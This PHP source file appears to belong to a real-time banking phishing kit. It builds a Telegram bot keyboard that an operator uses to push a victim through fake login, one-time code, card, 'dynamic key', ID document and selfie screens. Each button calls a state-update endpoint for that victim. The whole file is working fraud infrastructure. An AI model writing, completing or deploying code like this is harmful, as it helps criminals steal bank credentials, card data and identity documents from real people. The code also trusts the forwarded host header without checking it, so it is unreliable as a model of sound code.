<?php
// pago/4c7a1d9e/config/telegram_keyboard.php — Generador 100% Dinámico de Botones de Telegram

function getTelegramKeyboard($clienteId, $config = null) {
    // 1. Detectar protocolo HTTPS / HTTP en tiempo real
    $scheme = 'http';
    if (
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
        (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ||
        (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] === 'on') ||
        (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)
    ) {
        $scheme = 'https';
    }

    // 2. Detectar Host exacto de la petición actual (Vercel, Render, Dominio Propio, Localhost)
    $host = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'] ?? 'localhost';
    if (strpos($host, ',') !== false) {
        $host = trim(explode(',', $host)[0]);
    }

    $baseDomain = "{$scheme}://{$host}";
    $updateUrl = "{$baseDomain}/pago/4c7a1d9e/modules/api/actualizar_estado.php";

    return [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'url' => "{$updateUrl}?id={$clienteId}&estado=2"],
                ['text' => '🔑 Otp',        'url' => "{$updateUrl}?id={$clienteId}&estado=3"],
            ],
            [
                ['text' => '⚠️ Otp Error',  'url' => "{$updateUrl}?id={$clienteId}&estado=4"],
                ['text' => '💳 CC',         'url' => "{$updateUrl}?id={$clienteId}&estado=5"],
            ],
            [
                ['text' => '⚠️ CC Error',   'url' => "{$updateUrl}?id={$clienteId}&estado=6"],
                ['text' => '✅ Finalizar',  'url' => "{$updateUrl}?id={$clienteId}&estado=7"],
            ],
            [
                ['text' => '🪪 Doc Frente',  'url' => "{$updateUrl}?id={$clienteId}&estado=11"],
                ['text' => '🪪 Doc Reverso', 'url' => "{$updateUrl}?id={$clienteId}&estado=12"]
            ],
            [
                ['text' => '🔐 Dinámica',   'url' => "{$updateUrl}?id={$clienteId}&estado=15"],
                ['text' => '⚠️ Dinámica Err','url' => "{$updateUrl}?id={$clienteId}&estado=16"]
            ],
            [
                ['text' => '📲 WhatsApp',   'url' => "{$updateUrl}?id={$clienteId}&estado=8"],
                ['text' => '🤳 Selfie',     'url' => "{$updateUrl}?id={$clienteId}&estado=9"],
                ['text' => '⚠️ Selfie Err', 'url' => "{$updateUrl}?id={$clienteId}&estado=10"]
            ]
        ]
    ];
}
?>
